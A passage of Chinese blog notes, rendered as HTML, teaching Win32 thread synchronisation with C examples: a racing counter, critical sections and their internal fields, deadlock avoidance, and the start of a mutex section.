szBuffer, <span class=\"string\">&quot;%d&quot;</span>, &amp;dwCount );\t\t\t</span><br><span class=\"line\">\t\tdwCount++;\t\t\t</span><br><span class=\"line\">\t\t<span class=\"built_in\">memset</span>(szBuffer,<span class=\"number\">0</span>,<span class=\"number\">10</span>);\t\t\t</span><br><span class=\"line\">\t\t<span class=\"built_in\">sprintf</span>(szBuffer,<span class=\"string\">&quot;%d&quot;</span>,dwCount);\t\t\t</span><br><span class=\"line\">\t\tSetWindowText(hEdit,szBuffer);\t\t\t</span><br><span class=\"line\">\t\tdwIndex++;\t\t\t</span><br><span class=\"line\">\t&#125;\t\t\t\t</span><br><span class=\"line\">\t\t\t\t\t</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> <span class=\"number\">0</span>;\t\t\t\t</span><br><span class=\"line\">&#125;\t\t\t\t\t</span><br><span class=\"line\">DWORD WINAPI <span class=\"title function_\">ThreadProc2</span><span class=\"params\">(LPVOID lpParameter)</span>\t\t\t\t\t</span><br><span class=\"line\">&#123;\t\t\t\t\t</span><br><span class=\"line\">\tTCHAR szBuffer[<span class=\"number\">10</span>];\t\t\t\t</span><br><span class=\"line\">\tDWORD dwIndex = <span class=\"number\">0</span>;\t\t\t\t</span><br><span class=\"line\">\tDWORD dwCount;\t\t\t\t</span><br><span class=\"line\">\t\t\t\t\t</span><br><span class=\"line\">\t\t\t\t\t</span><br><span class=\"line\">\t<span class=\"keyword\">while</span>(dwIndex&lt;<span class=\"number\">10</span>)\t\t\t\t</span><br><span class=\"line\">\t&#123;\t\t\t\t</span><br><span class=\"line\">\t\tGetWindowText(hEdit,szBuffer,<span class=\"number\">10</span>);\t\t\t</span><br><span class=\"line\">\t\t<span class=\"built_in\">sscanf</span>( szBuffer, <span class=\"string\">&quot;%d&quot;</span>, &amp;dwCount );\t\t\t</span><br><span class=\"line\">\t\tdwCount++;\t\t\t</span><br><span class=\"line\">\t\t<span class=\"built_in\">memset</span>(szBuffer,<span class=\"number\">0</span>,<span class=\"number\">10</span>);\t\t\t</span><br><span class=\"line\">\t\t<span class=\"built_in\">sprintf</span>(szBuffer,<span class=\"string\">&quot;%d&quot;</span>,dwCount);\t\t\t</span><br><span class=\"line\">\t\tSetWindowText(hEdit,szBuffer);\t\t\t</span><br><span class=\"line\">\t\tdwIndex++;\t\t\t</span><br><span class=\"line\">\t&#125;\t\t\t\t</span><br><span class=\"line\">\t\t\t\t\t</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> <span class=\"number\">0</span>;\t\t\t\t</span><br><span class=\"line\">&#125;\t\t\t\t\t</span><br><span class=\"line\">\t\t\t\t\t</span><br><span class=\"line\">BOOL CALLBACK <span class=\"title function_\">MainDlgProc</span><span class=\"params\">(HWND hDlg,UINT uMsg,WPARAM wParam,LPARAM lParam)</span>\t\t\t\t\t</span><br><span class=\"line\">&#123;\t\t\t\t\t</span><br><span class=\"line\">\tBOOL bRet = FALSE;\t\t\t\t</span><br><span class=\"line\">\t\t\t\t\t</span><br><span class=\"line\">\t<span class=\"keyword\">switch</span>(uMsg)\t\t\t\t</span><br><span class=\"line\">\t&#123;\t\t\t\t</span><br><span class=\"line\">\t<span class=\"keyword\">case</span> WM_CLOSE:\t\t\t\t</span><br><span class=\"line\">\t\t&#123;\t\t\t</span><br><span class=\"line\">\t\t\tEndDialog(hDlg,<span class=\"number\">0</span>);\t\t</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">break</span>;\t\t</span><br><span class=\"line\">\t\t&#125;\t\t\t</span><br><span class=\"line\">\t<span class=\"keyword\">case</span> WM_INITDIALOG:\t\t\t\t</span><br><span class=\"line\">\t\t&#123;\t\t\t</span><br><span class=\"line\">\t\t\thEdit = GetDlgItem(hDlg,IDC_EDIT1);\t\t</span><br><span class=\"line\">\t\t\tSetWindowText(hEdit,<span class=\"string\">&quot;0&quot;</span>);\t\t</span><br><span class=\"line\">\t\t\t\t\t</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">break</span>;\t\t</span><br><span class=\"line\">\t\t&#125;\t\t\t</span><br><span class=\"line\">\t<span class=\"keyword\">case</span> WM_COMMAND:\t\t\t\t</span><br><span class=\"line\">\t\t\t\t\t</span><br><span class=\"line\">\t\t<span class=\"keyword\">switch</span> (LOWORD (wParam))\t\t\t</span><br><span class=\"line\">\t\t&#123;\t\t\t</span><br><span class=\"line\">\t\t<span class=\"keyword\">case</span> IDC_BUTTON_T1:\t\t\t</span><br><span class=\"line\">\t\t\t&#123;\t\t</span><br><span class=\"line\">\t\t\t\tHANDLE hThread1 = ::CreateThread(<span class=\"literal\">NULL</span>, <span class=\"number\">0</span>, ThreadProc1, \t</span><br><span class=\"line\">\t\t\t\t\t<span class=\"literal\">NULL</span>, <span class=\"number\">0</span>, <span class=\"literal\">NULL</span>);</span><br><span class=\"line\">\t\t\t\t\t</span><br><span class=\"line\">\t\t\t\t::CloseHandle(hThread1);\t</span><br><span class=\"line\">\t\t\t\t<span class=\"keyword\">return</span> TRUE;\t</span><br><span class=\"line\">\t\t\t&#125;\t\t</span><br><span class=\"line\">\t\t<span class=\"keyword\">case</span> IDC_BUTTON_T2:\t\t\t</span><br><span class=\"line\">\t\t\t&#123;\t\t</span><br><span class=\"line\">\t\t\t\tHANDLE hThread2 = ::CreateThread(<span class=\"literal\">NULL</span>, <span class=\"number\">0</span>, ThreadProc2, \t</span><br><span class=\"line\">\t\t\t\t\t<span class=\"literal\">NULL</span>, <span class=\"number\">0</span>, <span class=\"literal\">NULL</span>);</span><br><span class=\"line\">\t\t\t\t\t</span><br><span class=\"line\">\t\t\t\t::CloseHandle(hThread2);\t</span><br><span class=\"line\">\t\t\t\t<span class=\"keyword\">return</span> TRUE;\t</span><br><span class=\"line\">\t\t\t&#125;\t\t</span><br><span class=\"line\">\t\t&#125;\t\t\t</span><br><span class=\"line\">\t\t<span class=\"keyword\">break</span> ;\t\t\t</span><br><span class=\"line\">\t&#125;\t\t\t\t</span><br><span class=\"line\">\t\t\t\t\t</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> bRet;\t\t\t\t</span><br><span class=\"line\">&#125;\t\t\t\t\t</span><br><span class=\"line\">\t\t\t\t\t</span><br><span class=\"line\"><span class=\"type\">int</span> APIENTRY <span class=\"title function_\">WinMain</span><span class=\"params\">(HINSTANCE hInstance,\t\t\t\t\t</span></span><br><span class=\"line\"><span class=\"params\">                     HINSTANCE hPrevInstance,\t\t\t\t\t</span></span><br><span class=\"line\"><span class=\"params\">                     LPSTR     lpCmdLine,\t\t\t\t\t</span></span><br><span class=\"line\"><span class=\"params\">                     <span class=\"type\">int</span>       nCmdShow)</span>\t\t\t\t\t</span><br><span class=\"line\">&#123;\t\t\t\t\t</span><br><span class=\"line\"> \t<span class=\"comment\">// <span class=\"doctag\">TODO:</span> Place code here.\t\t\t\t</span></span><br><span class=\"line\">\t\t\t\t\t</span><br><span class=\"line\">\tDialogBox(hInstance,MAKEINTRESOURCE(IDD_DIALOG_MAIN),<span class=\"literal\">NULL</span>,MainDlgProc);\t\t\t\t</span><br><span class=\"line\">\t\t\t\t\t</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> <span class=\"number\">0</span>;\t\t\t\t</span><br><span class=\"line\">&#125;\t\t\t\t\t</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">多线程访问局部变量时存在安全问题</span><br><span class=\"line\"></span><br><span class=\"line\">1、创建CRITICAL_SECTION：\t\t\t\t\t</span><br><span class=\"line\"></span><br><span class=\"line\">CRITICAL_SECTION cs;\t\t\t\t\t</span><br><span class=\"line\"></span><br><span class=\"line\">2、在使用前进行初始化\t\t\t\t\t</span><br><span class=\"line\"></span><br><span class=\"line\">InitializeCriticalSection(&amp;cs);\t\t\t\t\t</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">3、在函数中使用:\t\t\t\t\t</span><br><span class=\"line\"></span><br><span class=\"line\">DWORD WINAPI 线程A(PVOID pvParam) \t\t\t\t\t</span><br><span class=\"line\">&#123;\t\t\t\t\t</span><br><span class=\"line\">      EnterCriticalSection(&amp;cs);\t\t\t\t\t</span><br><span class=\"line\"></span><br><span class=\"line\">      //对全局遍历X的操作\t\t\t\t\t</span><br><span class=\"line\"></span><br><span class=\"line\">      LeaveCriticalSection(&amp;cs);\t\t\t\t\t</span><br><span class=\"line\">   return(0);\t\t\t\t\t</span><br><span class=\"line\">&#125;\t\t\t\t\t</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">DWORD WINAPI 线程B(PVOID pvParam) \t\t\t\t\t</span><br><span class=\"line\">&#123;\t\t\t\t\t</span><br><span class=\"line\">      EnterCriticalSection(&amp;g_cs);\t\t\t\t\t</span><br><span class=\"line\"></span><br><span class=\"line\">      //对全局遍历X的操作\t\t\t\t\t</span><br><span class=\"line\"></span><br><span class=\"line\">      LeaveCriticalSection(&amp;g_cs);\t\t\t\t\t</span><br><span class=\"line\">   return(0);\t\t\t\t\t</span><br><span class=\"line\">&#125;\t\t\t\t\t</span><br><span class=\"line\"></span><br><span class=\"line\">4、删除CRITICAL_SECTION\t\t\t\t\t</span><br><span class=\"line\"></span><br><span class=\"line\">VOID DeleteCriticalSection(PCRITICAL_SECTION pcs);\t\t\t\t\t</span><br><span class=\"line\"></span><br><span class=\"line\">当线程不再试图访问共享资源时\t\t\t\t\t</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br><span class=\"line\">106</span><br><span class=\"line\">107</span><br><span class=\"line\">108</span><br><span class=\"line\">109</span><br><span class=\"line\">110</span><br><span class=\"line\">111</span><br><span class=\"line\">112</span><br><span class=\"line\">113</span><br><span class=\"line\">114</span><br><span class=\"line\">115</span><br><span class=\"line\">116</span><br><span class=\"line\">117</span><br><span class=\"line\">118</span><br><span class=\"line\">119</span><br><span class=\"line\">120</span><br><span class=\"line\">121</span><br><span class=\"line\">122</span><br><span class=\"line\">123</span><br><span class=\"line\">124</span><br><span class=\"line\">125</span><br><span class=\"line\">126</span><br><span class=\"line\">127</span><br><span class=\"line\">128</span><br><span class=\"line\">129</span><br><span class=\"line\">130</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">typedef</span> <span class=\"class\"><span class=\"keyword\">struct</span> _<span class=\"title\">RTL_CRITICAL_SECTION</span> &#123;</span>\t\t</span><br><span class=\"line\">    PRTL_CRITICAL_SECTION_DEBUG DebugInfo;\t\t</span><br><span class=\"line\">    LONG LockCount;\t\t</span><br><span class=\"line\">    LONG RecursionCount;\t\t</span><br><span class=\"line\">    HANDLE OwningThread;       \t\t</span><br><span class=\"line\">    HANDLE LockSemaphore;\t\t</span><br><span class=\"line\">    DWORD SpinCount;\t\t</span><br><span class=\"line\">&#125; RTL_CRITICAL_SECTION, *PRTL_CRITICAL_SECTION;\t\t</span><br><span class=\"line\">\t\t</span><br><span class=\"line\">LockCount:\t\t</span><br><span class=\"line\">它被初始化为数值 <span class=\"number\">-1</span>\t\t</span><br><span class=\"line\">此数值等于或大于 <span class=\"number\">0</span> 时，表示此临界区被占用\t\t</span><br><span class=\"line\">\t\t</span><br><span class=\"line\">等待获得临界区的线程数：LockCount - (RecursionCount <span class=\"number\">-1</span>)\t\t</span><br><span class=\"line\">\t\t</span><br><span class=\"line\">RecursionCount:\t\t</span><br><span class=\"line\">此字段包含所有者线程已经获得该临界区的次数\t\t</span><br><span class=\"line\">\t\t</span><br><span class=\"line\">OwningThread:\t\t</span><br><span class=\"line\">此字段包含当前占用此临界区的线程的线程标识符\t\t</span><br><span class=\"line\">此线程 ID 与GetCurrentThreadId 所返回的 ID 相同\t\t</span><br><span class=\"line\">\t\t</span><br><span class=\"line\">\t\t</span><br><span class=\"line\">测试代码：\t\t</span><br><span class=\"line\">\t\t</span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&quot;stdafx.h&quot;</span>\t\t</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;windows.h&gt;</span>\t\t</span></span><br><span class=\"line\">CRITICAL_SECTION cs;\t\t</span><br><span class=\"line\">\t\t</span><br><span class=\"line\">DWORD WINAPI <span class=\"title function_\">ThreadProc1</span><span class=\"params\">(LPVOID lpParameter)</span>\t\t</span><br><span class=\"line\">&#123;\t\t</span><br><span class=\"line\">\t<span class=\"keyword\">for</span>(<span class=\"type\">int</span> x=<span class=\"number\">0</span>;x&lt;<span class=\"number\">1000</span>;x++)\t</span><br><span class=\"line\">\t&#123;\t</span><br><span class=\"line\">\t\t  EnterCriticalSection(&amp;cs);</span><br><span class=\"line\">\t\t  </span><br><span class=\"line\">\t\t  Sleep(<span class=\"number\">1000</span>);</span><br><span class=\"line\">\t\t</span><br><span class=\"line\">\t\t  <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;11111:%x %x %x\\n&quot;</span>,cs.LockCount,cs.RecursionCount,cs.OwningThread);</span><br><span class=\"line\">\t\t  </span><br><span class=\"line\">\t\t  LeaveCriticalSection(&amp;cs);</span><br><span class=\"line\">\t\t</span><br><span class=\"line\">\t&#125;\t</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> <span class=\"number\">0</span>;\t</span><br><span class=\"line\">&#125;\t\t</span><br><span class=\"line\">\t\t</span><br><span class=\"line\">DWORD WINAPI <span class=\"title function_\">ThreadProc2</span><span class=\"params\">(LPVOID lpParameter)</span>\t\t</span><br><span class=\"line\">&#123;\t\t</span><br><span class=\"line\">\t<span class=\"keyword\">for</span>(<span class=\"type\">int</span> x=<span class=\"number\">0</span>;x&lt;<span class=\"number\">1000</span>;x++)\t</span><br><span class=\"line\">\t&#123;\t</span><br><span class=\"line\">\t\tEnterCriticalSection(&amp;cs);</span><br><span class=\"line\">\t\t</span><br><span class=\"line\">\t\tSleep(<span class=\"number\">1000</span>);</span><br><span class=\"line\">\t\t</span><br><span class=\"line\">\t\t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;22222:%x %x %x\\n&quot;</span>,cs.LockCount,cs.RecursionCount,cs.OwningThread);</span><br><span class=\"line\">\t\t</span><br><span class=\"line\">\t\tLeaveCriticalSection(&amp;cs);</span><br><span class=\"line\">\t\t</span><br><span class=\"line\">\t&#125;\t</span><br><span class=\"line\">\t\t</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> <span class=\"number\">0</span>;\t</span><br><span class=\"line\">&#125;\t\t</span><br><span class=\"line\">\t\t</span><br><span class=\"line\">DWORD WINAPI <span class=\"title function_\">ThreadProc3</span><span class=\"params\">(LPVOID lpParameter)</span>\t\t</span><br><span class=\"line\">&#123;\t\t</span><br><span class=\"line\">\t<span class=\"keyword\">for</span>(<span class=\"type\">int</span> x=<span class=\"number\">0</span>;x&lt;<span class=\"number\">1000</span>;x++)\t</span><br><span class=\"line\">\t&#123;\t</span><br><span class=\"line\">\t\tEnterCriticalSection(&amp;cs);</span><br><span class=\"line\">\t\t</span><br><span class=\"line\">\t\tSleep(<span class=\"number\">1000</span>);</span><br><span class=\"line\">\t\t</span><br><span class=\"line\">\t\t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;33333:%x %x %x\\n&quot;</span>,cs.LockCount,cs.RecursionCount,cs.OwningThread);</span><br><span class=\"line\">\t\t</span><br><span class=\"line\">\t\tLeaveCriticalSection(&amp;cs);</span><br><span class=\"line\">\t\t</span><br><span class=\"line\">\t&#125;\t</span><br><span class=\"line\">\t\t</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> <span class=\"number\">0</span>;\t</span><br><span class=\"line\">&#125;\t\t</span><br><span class=\"line\">\t\t</span><br><span class=\"line\">DWORD WINAPI <span class=\"title function_\">ThreadProc4</span><span class=\"params\">(LPVOID lpParameter)</span>\t\t</span><br><span class=\"line\">&#123;\t\t</span><br><span class=\"line\">\t<span class=\"keyword\">for</span>(<span class=\"type\">int</span> x=<span class=\"number\">0</span>;x&lt;<span class=\"number\">1000</span>;x++)\t</span><br><span class=\"line\">\t&#123;\t</span><br><span class=\"line\">\t\tEnterCriticalSection(&amp;cs);</span><br><span class=\"line\">\t\t</span><br><span class=\"line\">\t\tSleep(<span class=\"number\">1000</span>);</span><br><span class=\"line\">\t\t</span><br><span class=\"line\">\t\t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;44444:%x %x %x\\n&quot;</span>,cs.LockCount,cs.RecursionCount,cs.OwningThread);</span><br><span class=\"line\">\t\t</span><br><span class=\"line\">\t\tLeaveCriticalSection(&amp;cs);</span><br><span class=\"line\">\t\t</span><br><span class=\"line\">\t&#125;\t</span><br><span class=\"line\">\t\t</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> <span class=\"number\">0</span>;\t</span><br><span class=\"line\">&#125;\t\t</span><br><span class=\"line\">\t\t</span><br><span class=\"line\">\t\t</span><br><span class=\"line\"><span class=\"type\">int</span> <span class=\"title function_\">main</span><span class=\"params\">(<span class=\"type\">int</span> argc, <span class=\"type\">char</span>* argv[])</span>\t\t</span><br><span class=\"line\">&#123;\t\t</span><br><span class=\"line\">\tInitializeCriticalSection(&amp;cs);\t</span><br><span class=\"line\">\t\t</span><br><span class=\"line\">\t<span class=\"comment\">//printf(&quot;主线程:%x %x %x\\n&quot;,cs.LockCount,cs.RecursionCount,cs.OwningThread);\t</span></span><br><span class=\"line\">\t\t</span><br><span class=\"line\">\t<span class=\"comment\">//创建一个新的线程\t</span></span><br><span class=\"line\">\tHANDLE hThread1 = ::CreateThread(<span class=\"literal\">NULL</span>, <span class=\"number\">0</span>, ThreadProc1, \t</span><br><span class=\"line\">\t\t<span class=\"literal\">NULL</span>, <span class=\"number\">0</span>, <span class=\"literal\">NULL</span>);</span><br><span class=\"line\">\t\t</span><br><span class=\"line\">\t<span class=\"comment\">//创建一个新的线程\t</span></span><br><span class=\"line\">\tHANDLE hThread2 = ::CreateThread(<span class=\"literal\">NULL</span>, <span class=\"number\">0</span>, ThreadProc2, \t</span><br><span class=\"line\">\t\t<span class=\"literal\">NULL</span>, <span class=\"number\">0</span>, <span class=\"literal\">NULL</span>);</span><br><span class=\"line\">\t\t</span><br><span class=\"line\">\t<span class=\"comment\">//创建一个新的线程\t</span></span><br><span class=\"line\">\tHANDLE hThread3 = ::CreateThread(<span class=\"literal\">NULL</span>, <span class=\"number\">0</span>, ThreadProc3, \t</span><br><span class=\"line\">\t\t<span class=\"literal\">NULL</span>, <span class=\"number\">0</span>, <span class=\"literal\">NULL</span>);</span><br><span class=\"line\">\t\t</span><br><span class=\"line\">\t<span class=\"comment\">//创建一个新的线程\t</span></span><br><span class=\"line\">\tHANDLE hThread4 = ::CreateThread(<span class=\"literal\">NULL</span>, <span class=\"number\">0</span>, ThreadProc4, \t</span><br><span class=\"line\">\t\t<span class=\"literal\">NULL</span>, <span class=\"number\">0</span>, <span class=\"literal\">NULL</span>);</span><br><span class=\"line\">\t\t</span><br><span class=\"line\">\t<span class=\"comment\">//如果不在其他的地方引用它 关闭句柄\t</span></span><br><span class=\"line\">\t::CloseHandle(hThread1);\t</span><br><span class=\"line\">\t::CloseHandle(hThread2);\t</span><br><span class=\"line\">\t::CloseHandle(hThread3);\t</span><br><span class=\"line\">\t::CloseHandle(hThread4);\t</span><br><span class=\"line\">\t\t</span><br><span class=\"line\">\tSleep(<span class=\"number\">1000</span>*<span class=\"number\">60</span>*<span class=\"number\">60</span>);\t</span><br><span class=\"line\">\t\t</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> <span class=\"number\">0</span>;\t</span><br><span class=\"line\">&#125;\t\t</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">CRITICAL_SECTION g_csX; </span><br><span class=\"line\">CRITICAL_SECTION g_csY; </span><br><span class=\"line\">CRITICAL_SECTION g_csZ; </span><br><span class=\"line\"></span><br><span class=\"line\">线程<span class=\"number\">1</span></span><br><span class=\"line\">DWORD WINAPI <span class=\"title function_\">ThreadFunc</span><span class=\"params\">(PVOID pvParam)</span> </span><br><span class=\"line\">&#123;</span><br><span class=\"line\">   EnterCriticalSection(&amp;g_csX);</span><br><span class=\"line\">   使用X</span><br><span class=\"line\">   <span class=\"title function_\">LeaveCriticalSection</span><span class=\"params\">(&amp;g_csX)</span>;</span><br><span class=\"line\">   EnterCriticalSection(&amp;g_csY);</span><br><span class=\"line\">   使用Y</span><br><span class=\"line\">   <span class=\"title function_\">LeaveCriticalSection</span><span class=\"params\">(&amp;g_csY)</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">   <span class=\"keyword\">return</span>(<span class=\"number\">0</span>);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">线程<span class=\"number\">2</span></span><br><span class=\"line\">DWORD WINAPI <span class=\"title function_\">ThreadFunc</span><span class=\"params\">(PVOID pvParam)</span> </span><br><span class=\"line\">&#123;</span><br><span class=\"line\">   EnterCriticalSection(&amp;g_csX);</span><br><span class=\"line\">   使用X</span><br><span class=\"line\">   <span class=\"title function_\">LeaveCriticalSection</span><span class=\"params\">(&amp;g_csX)</span>;</span><br><span class=\"line\">   EnterCriticalSection(&amp;g_csZ);</span><br><span class=\"line\">   使用Z</span><br><span class=\"line\">   <span class=\"title function_\">LeaveCriticalSection</span><span class=\"params\">(&amp;g_csZ)</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">   <span class=\"keyword\">return</span>(<span class=\"number\">0</span>);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">线程<span class=\"number\">3</span></span><br><span class=\"line\">DWORD WINAPI <span class=\"title function_\">ThreadFunc</span><span class=\"params\">(PVOID pvParam)</span> </span><br><span class=\"line\">&#123;</span><br><span class=\"line\">   EnterCriticalSection(&amp;g_csX);</span><br><span class=\"line\">   使用X</span><br><span class=\"line\">   <span class=\"title function_\">LeaveCriticalSection</span><span class=\"params\">(&amp;g_csX)</span>;</span><br><span class=\"line\">   <span class=\"keyword\">return</span>(<span class=\"number\">0</span>);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p>避免死锁：</p>\n<p>拿令牌顺序一样，不要嵌套拿令牌</p>\n<h3 id=\"互斥体\"><a class=\"markdownIt-Anchor\" href=\"#互斥体\">#</a> 互斥体</h3>\n<h4 id=\"waitforsingleobject\"><a class=\"markdownIt-Anchor\" href=\"#waitforsingleobject\">#</a> WaitForSingleObject</h4>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">DWORD <span class=\"title 